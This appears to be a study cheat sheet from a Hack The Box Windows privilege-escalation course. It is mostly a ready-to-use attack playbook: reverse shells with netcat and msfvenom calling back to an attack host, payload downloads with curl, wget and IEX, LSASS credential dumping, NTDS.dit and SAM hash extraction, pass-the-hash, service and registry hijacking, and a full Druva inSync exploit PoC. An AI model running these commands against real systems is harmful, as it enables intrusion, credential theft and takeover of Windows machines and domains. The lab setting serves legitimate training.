[Windows Executables for Pentesting](https://github.com/Flangvik/SharpCollection/tree/master/NetFramework_4.7_x64)
[PayloadsAllTheThings Checklist/Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

## Initial Enumeration

### Key Data Points:
- OS Name
- Version
- Running Services

```Shell
xfreerdp /v:<target ip> /u:htb-student
```
RDP to lab target

#### Interface(s), IP Address(es), DNS Information
```cmd.exe
ipconfig /all
```
Get interface, IP address and DNS information

#### ARP Table
```cmd.exe
arp -a
```
Review ARP table

#### Routing Table
```cmd.exe
route print
```
Review routing table

#### Enumerating Protections
```PowerShell
Get-MpComputerStatus
```
Check Windows Defender status

```PowerShell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```
List AppLocker rules

```PowerShell
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```
Test AppLocker policy

### System Information
```cmd.exe
set
```
Display all environment variables

```cmd.exe
systeminfo
```
View detailed system configuration information

```cmd.exe
wmic qfe
```
Get patches and updates

```PowerShell
Get-HotFix | ft -AutoSize
```
Get patches and updates

#### Installed Programs
```cmd.exe
wmic product get name
```
Get installed programs

```PowerShell
Get-WmiObject -Class Win32_Product |  select Name, Version
```
Get installed programs

#### Tasklist
```cmd.exe
tasklist /svc
```
Display running processes

#### Logged-In Users
```cmd.exe
query user
```
Get logged-in users

```cmd.exe
echo %USERNAME%
```
Get current user

#### Current User Privileges
```cmd.exe
whoami /priv
```
View current user privileges

#### Current User Group Information
```cmd.exe
whoami /groups
```
View current user group information

#### Get All Users
```cmd.exe
net user
```
Get all system users

#### Get All Groups
```cmd.exe
net localgroup
```
Get all system groups

#### Details About a Group
```cmd.exe
net localgroup administrators
```
View details about a group

#### Get Password Policy & Other Account Information
```cmd.exe
net accounts
```
Get passsword policy

## Communication with Processes

### Enumerating Network Services

#### Netstat
```cmd.exe
netstat -ano
```
Display active network connections

### Named Pipes
```cmd.exe
pipelist.exe /accepteula
```
List named pipes

```PowerShell
gci \\.\pipe\
```
List named pipes with PowerShell

#### Reviewing LSASS Named Pipe Permissions
```cmd.exe
accesschk.exe /accepteula \\.\Pipe\lsass -v
```
Review permissions on a named pipe

#### Named Pipes Attack Example
```cmd.exe
accesschk.exe -accepteula -w \pipe\WindscribeService -v
```
Checks WindscribeService named pipe permissions

## SeImpersonate and SeAssignPrimaryToken

#### Connecting with MSSQLClient.py
```Shell
mssqlclient.py sql_dev@10.129.43.30 -windows-auth
```
Connect using mssqlclient.py

#### Enabling xp_cmdshell
```Shell
enable_xp_cmdshell
```
Enable xp_cmdshell with mssqlclient.py

#### Confirming Access
```Shell
xp_cmdshell whoami
```
Run OS commands with xp_cmdshell

#### Checking Account Privileges
```Shell
xp_cmdshell whoami /priv
```
Checks what privileges the service account has been granted

#### Escalating Privileges Using JuicyPotato
```Shell
xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```
Escalate privileges with JuicyPotato

#### Catching Reverse Shell
```Shell
nc -lnvp 8443
```
Catches the Reverse Shell as SYSTEM

#### Escalating Privileges Using PrintSpoofer
```Shell
xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```
Escalating privileges with PrintSpoofer

#### Catching Reverse Shell
```Shell
nc -lnvp 8443
```
Catches the Reverse Shell as SYSTEM


## SeDebugPrivilege

#### Check for SeDubPrivilege
```cmd.exe
whoami /priv
```
Enumerates the users privileges to determine if they have SeDebugPrivileges

#### Using procdump
```cmd.exe
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
Take memory dump with ProcDump

#### Using Mimikatz to extract credentials
```cmd.exe
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```
Use MimiKatz to extract credentials from LSASS memory dump

## Windows Built-in Groups

#### Groups to check:
- Backup Operators
- Hyper-V Administrators
- Event Log Readers
- Print Operators
- DnsAdmins
- Server Operators

## Backup Operators
- Privileges:
	- SeRestore
	- SeBackupPrivilege: Allows us to traverse any folder and list the folder contents. This will let us copy a file from a folder, even if there is no access control entry (ACE) for us in the folder's access control list (ACL). However, we can't do this using the standard copy command. Instead, we need to programmatically copy the data, making sure to specify the `FILE_FLAG_BACKUP_SEMANTICS` flag.

#### Importing Libraries
```PowerShell
Import-Module .\SeBackupPrivilegeUtils.dll
```

```PowerShell
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

#### Verifying SeBackupPrivilege is Enabled
```PowerShell
whoami /priv
```
PowerShell command to verify that SeBackupPrivilege is enabled on the host

#### Enabling SeBackupPrivilege
```PowerShell
Set-SeBackupPrivilege
```

```PowerShell
Get-SeBackupPrivilege
```
Enables SeBackupPrivilege if it was disabled

#### Copying a Protected File
```PowerShell
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
```
Command which uses SeBackupPrivilege to copy a file from a remote location to a folder the attacker has access to

#### Attacking a Domain Controller - Copying NTDS.dit
```PowerShell
diskshadow.exe

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
```
Exposes the share file for the Domain Controller (shouuld be `E:`)

#### Copying NTDS.dit Locally
```PowerShell
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Uses SeBackupPrivilege to copy the NTDS.dit file to a local location

#### Backing up SAM and SYSTEM Registry Hives
```cmd.exe
reg save HKLM\SYSTEM SYSTEM.SAV
```
Saves the SYSTEM registry hive locally

```cmd.exe
reg save HKLM\SAM SAM.SAV
```
Saves the SAM registry locally

#### Extracting Credentials from NTDS.dit
```PowerShell
Import-Module .\DSInternals.psd1
```

```PowerShell
$key = Get-BootKey -SystemHivePath .\SYSTEM
```

```PowerShell
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```
Obtains the NTLM hash for just the administrator account for the domain using DSInternals.

#### Crack offline with Hashcat
```cmd.exe
hashcat -m 5600 nthash /usr/share/wordlists/rockyou.txt
```

#### Extracting Hashes Using SecretsDump
```Shell
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

### Robocopy

#### Copying Files with Robocopy
```cmd.exe
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```
Copies the NTDS.dit file to a local location. The NTLM hash for the Administrator account can then be extracted and cracked with Hashcat, then used w/ secretsdump to find extract all the Domain hashes.

## Event Log Readers

#### Confirming Group Membership
```cmd.exe
net localgroup "Event Log Readers"
```

#### Searching Security Logs Using wevtutil
```PowerShell
wevtutil qe Security /rd:true /f:text | Select-String "/user"
```

#### Passing Credentials to wevtutil
```cmd.exe
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```
Passes alternate credentials into `wevutil`

#### Searching Security Logs Using Get-WinEvent
```PowerShell
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```
Searches security logs using `Get-WinEvent`, filtering for process creation events (4688), which contain `/user` in the process command line

*The cmdlet can also be run as another user with the `-Credential `parameter.*

## DnsAdmins

#### Generating Malicious DLL
```Shell
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll 	
```
Generates a malicious DLL w/ msfvenom to add the dll to the domain admins group files for DNS.
```cmd.exe
dnscmd.exe /config /serverlevelplugindll adduser.dll 
```
Loading a custom DLL with dnscmd. Note: You must specify the full path to our custom DLL or the attack will not work properly.

*With the registry setting containing the path of our malicious plugin configured, and our payload created, the DLL will be loaded the next time the DNS service is started. Membership in the DnsAdmins group doesn't give the ability to restart the DNS service, but this is conceivably something that sysadmins might permit DNS admins to do.

*After restarting the DNS service (if our user has this level of access), we should be able to run our custom DLL and add a user (in our case) or get a reverse shell. If we do not have access to restart the DNS server, we will have to wait until the server or service restarts. Let's check our current user's permissions on the DNS service.*

#### Finding User's SID
```cmd.exe
wmic useraccount where name="netadm" get sid 
```
Finding a user's SID

#### Checking Permissions on DNS Service
```cmd.exe
sc.exe sdshow DNS 
```
Checking permissions on DNS service. Article to assist with translating permissions:
https://www.winhelponline.com/blog/view-edit-service-permissions-windows/

#### Stopping the DNS Service
```cmd.exe
sc stop dns
```
Stopping a service

#### Starting the DNS Service
```cmd.exe
sc start dns
```
Starting a service

#### Confirming Group Membership
```cmd.exe
net group "Domain Admins" /dom
```
Our account will be added to the Domain Admins group or receive a reverse shell if our custom DLL was made to give us a connection back (would require an msfvenom payload to call a connection back to the attack host)

*Key takeaway from the lab: after stopping and starting the DNS service, log out of RDP with `shutdown -l` and restart the instance over RDP. This will give you access to the Administrator's privileges.*

#### Cleaning Up

#### 1) Confirm Registry key Added
```cmd.exe
reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
```
Querying a registry key

#### 2) Deleting Registry Key
```cmd.exe
reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
```
Deleting a registry key

#### 3) Starting the DNS Service Again
```cmd.exe
sc.exe start dns
```

#### 4) Checking the DNS Service Status
```cmd.exe
sc query dns
```
Checking service status. Should show that it's running again.

### Abusing DnsAdmins with a WPAD Record
*After disabling the global query block list and creating a WPAD record, every machine running WPAD with default settings will have its traffic proxied through our attack machine. We could use a tool such as Responder or Inveigh to perform traffic spoofing, and attempt to capture password hashes and crack them offline or perform an SMBRelay attack.*

#### Disabling the Global Query Block List
```PowerShell
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```
Disabling the global query block list

#### Adding a WPAD Record
```PowerShell
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```
Adding a WPAD record

## Print Operators

- Privilege Name: `SeLoadDriverPrivilege`

#### Check privileges with `whoami /priv`. If `SeLoadDriverPrivilege` isn't enabled, upload Capcoms.sys

Download it on a Visual Studio 2019 Developer Command Prompt, pasting over the includes as:
```C
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"
```

#### Compile Capcom.sys with cl.exe
```cmd.exe
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
```

#### Add Reference to Driver
Download the `Capcom.sys` driver from Kali, and save it to `C:\Temp`*
```cmd.exe
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
```
Add reference to a driver (1)

```cmd.exe
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```
Add reference to a driver (2)

#### Verify Driver is not Loaded
```PowerShell
.\DriverView.exe /stext drivers.txt
```

```PowerShell
cat drivers.txt | Select-String -pattern Capcom
```

#### Verify Privilege is Enabled
```cmd.exe
EnableSeLoadDriverPrivilege.exe
```
Ensure `EnableSeLoadDriverPrivilege` is enabled

#### Verify Capcom Driver is Listed
```PowerShell
.\DriverView.exe /stext drivers.txt
```

```PowerShell
cat drivers.txt | Select-String -pattern Capcom
```

#### Use ExploitCapcom Tool to Escalate Privileges
```PowerShell
.\ExploitCapcom.exe
```

This launches a shell with SYSTEM privileges.

#### Alternate Exploitation - No GUI
If we do not have GUI access to the target, we will have to modify the `ExploitCapcom.cpp` code before compiling. Here we can edit line 292 and replace `C:\\Windows\\system32\\cmd.exe` with, say, a reverse shell binary created with msfvenom, for example: `c:\ProgramData\revshell.exe`.

```C
// Launches a command shell process
static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}
```

The CommandLine string in this example would be changed to:
```C
TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
```
We would set up a listener based on the` msfvenom` payload we generated and hopefully receive a reverse shell connection back when executing `ExploitCapcom.exe`. If a reverse shell connection is blocked for some reason, we can try a bind shell or exec/add user payload.

### Automating the Steps

#### Automating with EopLoadDriver
```cmd.exe
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
```

We would then run` ExploitCapcom.exe` to pop a SYSTEM shell or run our custom binary.

### Clean-up

#### Removing Registry Key
```cmd.exe
reg delete HKCU\System\CurrentControlSet\Capcom
```

*NOTE: Since Windows 10 Version 1803, the "SeLoadDriverPrivilege" is not exploitable, as it is no longer possible to include references to registry keys under "HKEY_CURRENT_USER".*

***Lab Note: Run as Administrator to complete it successfully*


## Server Operators

#### Querying the AppReadiness Service
```cmd.exe
sc qc AppReadiness
```
We can confirm that this service starts as `SYSTEM` using the `sc.exe` utility.

#### Checking Service Permissions with PsService
```cmd.exe
PsService.exe security AppReadiness
```
This confirms that the Server Operators group has `SERVICE_ALL_ACCESS` access right, which gives us full control over this service.
	`[ALLOW] BUILTIN\Server Operators
                `All`

#### Checking Local Admin Group Membership
```cmd.exe
net localgroup Administrators
```

#### Modifying the Service Binary Path
```cmd.exe
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```
Should show: `[SC] ChangeServiceConfig SUCCESS`

#### Starting the Service
```cmd.exe
sc start AppReadiness
```
*Starting the service won't be successful yet though.*

#### Confirming Local Admin Group Membership
```cmd.exe
net localgroup Administrators
```
If we check the membership of the administrators group, we see that the command was executed successfully, and that our user has access to the Administrators group.

#### Confirming Local Admin Access on Domain Controller
```Shell
crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
```

#### Retrieving NTLM Password Hashes from the Domain Controller
```Shell
secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
```

*Can either crack the hash with Hashcat or Pass-the-Hash to access the DC*

***Lab Note: Used psexec.py to PtH and access DC, as xfreerdp wasn't working*
```Shell
psexec.py Administrator@10.129.43.42 -hashes :7796ee39fd3a9c3a1844556115ae1a54
```


## User Account Control

#### Confirming UAC is Enabled
```cmd.exe
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```
Will state `EnableLUA` if UAC is enabled

#### Checking UAC Level
```cmd.exe
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```
The value of `ConsentPromptBehaviorAdmin` is `0x5`, which means the highest UAC level of `Always notify` is enabled. There are fewer UAC bypasses at this highest level.

#### Checking Windows Version
```PowerShell
[environment]::OSVersion.Version
```
You can reference more information regarding the OS version at: https://en.wikipedia.org/wiki/Windows_10_version_history. *The example for the reading and lab is version 14393.*

#### UACMe Project
Link: https://github.com/hfiref0x/UACME
Maintains a list of UAC bypasses, including information on the affected Windows build number, the technique used, and if Microsoft has issued a security update to fix it. 

#### Reviewing Path Variable
```PowerShell
cmd /c echo %PATH%
```
We can potentially bypass UAC in this by using DLL hijacking by placing a malicious `srrstr.dll` DLL to `WindowsApps` folder, which will be loaded in an elevated context.

#### Generating Malicious srrstr.dll DLL
```Shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
```

#### Starting Python HTTP Server on Attack Host
```Shell
python3 -m http.server 8080
```
Sets up a Python mini webserver to host the DLL

#### Downloading DLL Target
```PowerShell
curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
```

#### Starting an nc Listener on Attack Host
```Shell
nc -lnvp 8443
```

#### Testing Connection
```cmd.exe
rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```
If we execute the malicious `srrstr.dll` file, we will receive a shell back showing normal user rights (UAC enabled). To test this, we can run the DLL using `rundll32.exe` to get a reverse shell connection.

*Test this with the netcat shell using `whoami /priv`*

#### Executing SystemPropertiesAdvanced.exe on Target Host
```cmd.exe
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```
Execute the 32-bit version of `SystemPropertiesAdvanced.exe` from the target host. *Note: You don't have to restart the netcat listener before running this executable.*

*Check the netcat listener. All privileges will be enabled.*


## Weak Permissions

### Permissive File System ACLs

#### Running SharpUp
```PowerShell
.\SharpUp.exe audit
```
`DisplayName` will identify a binary (`Name`) to be executed when started

#### Checking Permissions with icacls
```PowerShell
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```
We can verify the vulnerability and see that the `EVERYONE` and `BUILTIN\Users` groups have been granted full permissions to the directory, and therefore any unprivileged system user can manipulate the directory and its contents

#### Replacing Service Binary
```cmd.exe
cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

```cmd.exe
sc start SecurityService
```
This service is also startable by unprivileged users, so we can make a backup of the original binary and replace it with a malicious binary generated with `msfvenom`. It can give us a reverse shell as `SYSTEM`, or add a local admin user and give us full administrative control over the machine.

#### ***For lab:*

Created msfvenom payload:
```Shell
msfvenom -p windows/shell_reverse_tcp lhost=10.10.16.19 lport=4443 -f exe > SecurityService.exe
```

Moved the `SecurityService` executable to a different file name:
```cmd.exe
move "C:\Program Files (x86)\PCProtect\SecurityService.exe" "C:\Program Files (x86)\PCProtect\SecurityServices.exe"
```

Used cURL on PowerShell to download msfvenom payload to replace `SecurityService` executable in previous location:
```PowerShell
curl http://10.10.16.19:8000/SecurityService.exe -O "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

Ran netcat listener on attack host:
```cmd.exe
nc -lnvp 4443
```

Started `SecurityService`:
```cmd.exe
sc start SecurityService
```

This gave me a reverse shell on the Kali attack host.

### Weak Service Permissions

#### Reviewing SharpUp Again
```cmd.exe
SharpUp.exe audit
```
In the example, We see the `WindscribeService` is potentially misconfigured.

#### Checking Permissions with AccessChk

```cmd.exe
accesschk.exe /accepteula -quvcw WindscribeService
```
`-q` (omit banner), `-u` (suppress errors), `-v` (verbose), `-c` (specify name of a Windows service), and `-w` (show only objects that have write access). *The example shows `SERVICE_ALL_ACCESS` rights over the WindscribeService, allowing full read/write control.*

#### Check Local Admin Group
```cmd.exe
net localgroup administrators
```
Our user is not yet a member

#### Changing the Service Binary Path
```cmd.exe
sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
```
We can use our permissions to change the binary path maliciously. Let's change it to add our user to the local administrator group. We could set the binary path to run any command or executable of our choosing (such as a reverse shell binary).

#### Stopping the Service
```cmd.exe
sc stop WindscribeService
```

#### Starting the Service
```cmd.exe
sc start WindscribeService
```
The command we placed in the binpath will run even though an error message is returned

#### Confirming Local Admin Group Addition
```cmd.exe
net localgroup administrators
```

### Weak Service Permissions - Cleanup

#### Reverting the Binary Path
```cmd.exe
sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"
```

#### Starting the Service Again
```cmd.exe
sc start WindscribeService
```

#### Verifying Service is Running
```cmd.exe
sc query WindscribeService
```


### Unquoted Service Paths

Service paths not incapsulated in quotation marks. e.g, `C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe`

#### Querying Service
```cmd.exe
sc qc SystemExplorerHelpService
```
`BINARY_PATH_NAME` will show the path to the service executable.

#### Searching for Unquoted Service Paths
```cmd.exe
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```


### Permissive Registry ACLs

#### Checking for Weak Service ACLs in Registry
```cmd.exe
accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
```

#### Changing ImagePath with PowerShell
```PowerShell
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```
We can abuse this using the PowerShell cmdlet `Set-ItemProperty` to change the` ImagePath` value. This example calls for netcat to connect to a listener on our attack host.

### Modifiable Registry Autorun Binary

#### Check Startup Programs
```PowerShell
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
```
If we have write permissions to the registry for a given binary or can overwrite a binary listed, we may be able to escalate privileges to another user the next time that the user logs in



## Kernel Exploits

Microsoft CVE database: https://msrc.microsoft.com/update-guide/vulnerability

#### High Impact Exploits
- MS08-067
- MS17-010, aka EternalBlue
- ALPC Task Scheduler 0-Day
- CVE-2021-36934 HiveNightmare, aka SeriousSam
- CVE-2021-1675/CVE-2021-34527 PrintNightmare

### CVE-2021-36934 HiveNightmare, aka SeriousSam

#### Checking Permissions on the SAM File
```cmd.exe
icacls c:\Windows\System32\config\SAM
```
In the course material, we have a vulnerable version as the file is readable by the `BUILTIN\Users` group

*Successful exploitation also requires the presence of one or more shadow copies. Most Windows 10 systems will have System Protection enabled by default which will create periodic backups, including the shadow copy necessary to leverage this flaw.*

#### Performing Attack and Parsing Password Hashes
```PowerShell
.\CVE-2021-36934.exe
```

This will dump the hashes, which can then be used for a PtH attack or password cracking offline.

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

#### Checking for Spooler Service
```PowerShell
ls \\localhost\pipe\spoolss
```
If it isn't running, we will receive a "path does not exist" error.

#### Adding Local Admin with PrintNightmare PowerShell PoC
```PowerShell
Set-ExecutionPolicy Bypass -Scope Process
```

#### Importing the PowerShell script and adding a new local admin user
```PowerShell
Import-Module .\CVE-2021-1675.ps1
```

```PowerShell
Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
```
Adding a user is "noisy," We would not want to do this on an engagement where stealth is a consideration. Check with client to confirm account creation is in scope.

#### Confirming New Admin User
```PowerShell
net user hacker
```

### Enumerating Missing Patches

#### Examining Installed Updates
```PowerShell
systeminfo
```

```PowerShell
wmic qfe list brief
```

```PowerShell
Get-Hotfix
```

#### Viewing Installed Updates with WMI
```PowerShell
wmic qfe list brief
```
We can search for each KB (Microsoft Knowledge Base ID number) in the Microsoft Update Catalog: https://www.catalog.update.microsoft.com/

### Microsoft CVE-2020-0668: Windows Kernel Elevation of Privilege Vulnerability

#### Checking Current User Privileges
```cmd.exe
whoami /priv
```

#### Building Solution
This privileged file write needs to be chained with another vulnerability, such as UsoDllLoader or DiagHub to load the DLL and escalate our privileges.

#### Checking Permissions on Binary
```cmd.exe
icacls "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```
`icacls `confirms that we only have read and execute permissions on this binary based on the line `BUILTIN\Users:(I)(RX`) in the command output.

#### Generating Malicious Binary
```Shell
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe
```

#### Hosting the Malicious Binary
```Shell
python3 -m http.server 8080
```
*Will need to copy it to the system twice*

#### Downloading the Malicious Binary
```PowerShell
wget http://10.10.15.244:8080/maintenanceservice.exe -O maintenanceservice.exe
```

```PowerShell
wget http://10.10.15.244:8080/maintenanceservice.exe -O maintenanceservice2.exe
```

#### Running the Exploit
```cmd.exe
C:\Tools\CVE-2020-0668\CVE-2020-0668.exe C:\Users\htb-student\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```
It accepts two arguments, the source and destination files

#### Checking Permissions of New File
```cmd.exe
icacls 'C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe'
```
Shows the following entry for our user: `WINLPE-WS02\htb-student:(F)`

#### Replacing File with Malicious Binary
```cmd.exe
copy /Y C:\Users\htb-student\Desktop\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

#### Metasploit Resource Script
Next, save the below commands to a Resource Script file named `handler.rc`
```Shell
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT 8443
exploit
```

#### Launching Metasploit with Resource Script
```Shell
sudo msfconsole -r handler.rc
```

#### Starting the Service
```cmd.exe
net start MozillaMaintenance 
```

#### Receiving a Meterpreter Session
We will get an error trying to start the service but will still receive a callback once the Meterpreter binary executes.


## Vulnerable Services

#### Enumerating Installed Programs
```cmd.exe
wmic product get name
```
Google services that aren't typically standard on Windows systems and see if there are exploits available for that version.

*Example: Druva inSync. Escalation is possible by interacting with a service running locally on port 6064.*

#### Enumerating Local Ports
```cmd.exe
netstat -ano | findstr 6064
```

#### Enumerating Process ID
```PowerShell
get-process -Id 3324
```
Maps the process ID from port enumeration back to the running process

#### Enumerating Running Service
```PowerShell
get-service | ? {$_.DisplayName -like 'Druva*'}
```

#### Druva inSync PowerShell PoC
```PowerShell
# Exploit Title: Druva inSync Windows Client 6.6.3 - Local Privilege Escalation (PowerShell)
# Date: 2020-12-03
# Exploit Author: 1F98D
# Original Author: Matteo Malvica
# Vendor Homepage: druva.com
# Software Link: https://downloads.druva.com/downloads/inSync/Windows/6.6.3/inSync6.6.3r102156.msi
# Version: 6.6.3
# Tested on: Windows 10 (x64)
# CVE: CVE-2020-5752
# References: https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/
# Druva inSync exposes an RPC service which is vulnerable to a command injection attack.

$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
            
```

#### Modifying PowerShell PoC
Use `Invoke-PowerShellTcp.ps1`  script at: https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1. Append the following at the bottom of the script:
```PowerShell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443
```

Modify the $cmd variable in the Druva inSync exploit PoC script to download our PowerShell reverse shell into memory.
```PowerShell
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.4:8080/shell.ps1')"
```
#### Catching a SYSTEM Shell

```Shell
python3 -m http.server 8080
```
Starts a Python Web server in the same folder as `shell.ps1`

```Shell
nc -lnvp 9443
```
Starts a netcat listener on the attack host

```PowerShell
Set-ExecutionPolicy Bypass -Scope Process
```
Modifies the PowerShell execution policy

```PowerShell
.\DruvaInSync.ps1
```
Executes the PoC PowerShell script on the target host


## Credential Hunting

### Application Configuration Files

#### Searching for Files
```PowerShell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```
Sensitive IIS information such as credentials may be stored in a `web.config` file. For the default IIS website, this could be located at `C:\inetpub\wwwroot\web.config`, but there may be multiple versions of this file in different locations, which we can search for recursively.

### Dictionary Files

#### Chrome Dictionary Files
```PowerShell
gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```

### Unattended Installation Files
Passwords in the `unattend.xml` are stored in plaintext or base64 encoded.

### PowerShell History File

#### Confirming PowerShell History Save Path
```PowerShell
(Get-PSReadLineOption).HistorySavePath
```

#### Reading PowerShell History File
```PowerShell
gc (Get-PSReadLineOption).HistorySavePath
```

#### One-liner to retrieve the contents of all Powershell history files that we can access as our current user
```PowerShell
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```

### PowerShell Credentials

#### Decrypting PowerShell Credentials
If we have gained command execution in the context of this user or can abuse DPAPI, then we can recover the cleartext credentials from encrypted.xml. The example below assumes the former.
```PowerShell
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
```

```PowerShell
$credential.GetNetworkCredential().username
```

```PowerShell
$credential.GetNetworkCredential().password
```

### Manually Searching the File System for Credentials

File hunting cheatsheet: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#search-for-a-file-with-a-certain-filename

#### Example Searches for File Contents
```cmd.exe
cd c:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt
```

```cmd.exe
findstr /si password *.xml *.ini *.txt *.config
```

```cmd.exe
findstr /spin "password" *.*
```

```PowerShell
select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password
```

#### Search File Extensions
```cmd.exe
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
```

```cmd.exe
where /R C:\ *.config
```

```PowerShell
Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
```

#### Sticky Notes Passwords
